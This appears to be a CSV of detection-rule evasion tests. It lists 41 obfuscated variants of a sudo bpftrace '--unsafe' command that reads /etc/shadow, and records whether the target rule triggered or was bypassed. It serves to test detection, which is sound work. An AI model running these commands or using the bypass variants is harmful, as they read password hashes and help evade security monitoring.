ID,Command,Log File,Result,All Detected Rules
1,"sudo bpftrace --""unsafe"" -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack1.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
2,"sudo bpftrace --un""safe"" -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack2.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
3,"sudo bpftrace --uns afe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack3.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
4,"sudo bpftrace --un_safe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack4.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
5,"sudo bpftrace --unsa+fe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack5.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
6,"sudo bpftrace --unsaf\\e -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack6.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
7,"sudo bpftrace --uns\""afe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack7.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
8,"sudo bpftrace --unsa/**/fe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack8.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
9,"sudo bpftrace --u\nsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack9.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
10,"sudo bpftrace --unsa\tfe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack10.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
11,"sudo bpftrace --uns<afe> -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack11.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
12,"sudo bpftrace '--unsafe' -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack12.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
13,"sudo bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }' --unsafe",BPFtrace_Unsafe_Option_Usage_attack13.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
14,"sudo bpftrace --un-safe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack14.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
15,"sudo bpftrace --u_n_s_a_f_e -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack15.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
16,"sudo bpftrace --uNSAFE -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack16.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
17,"sudo bpftrace --unsa\u0066e -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack17.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
18,"sudo bpftrace --unsa$fe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack18.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
19,"sudo bpftrace --unsa%20fe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack19.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
20,"sudo bpftrace --""un""""safe"" -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack20.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
21,"`sudo bpftrace --unsaf﻿e -e 'BEGIN { cat(""/etc/shadow""); exit(); }'` *(invisible char)*",BPFtrace_Unsafe_Option_Usage_attack21.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
22,"sudo bpftrace --unsaf\u200b-e -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack22.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
23,"sudo bpftrace --@unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack23.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
24,"sudo bpftrace --_unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack24.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
25,"sudo bpftrace --unsaf-e -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack25.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
26,"sudo bpftrace --uunsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack26.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
27,"sudo bpftrace --unsa-f-e -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack27.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
28,"sudo bpftrace --unsafee -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack28.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
29,"sudo bpftrace --u n s a f e -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack29.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
30,"sudo bpftrace --""uns""""afe"" -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack30.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
31,"sudo bpftrace --un\ safe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack31.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
32,"sudo bpftrace --unsa\ fe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack32.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
33,"sudo bpftrace --un$afe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack33.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
34,"sudo bpftrace --u$nsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack34.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
35,"sudo bpftrace --un.sa.fe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack35.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
36,"sudo bpftrace --un/safe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack36.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
37,"sudo bpftrace --un_safe_ -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack37.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
38,"sudo bpftrace --unsafe\ -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack38.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
39,"sudo bpftrace --un-safe- -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack39.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
40,"sudo bpftrace --unSAFE -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack40.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
41,"sudo bpftrace --UNSAFE -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack41.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
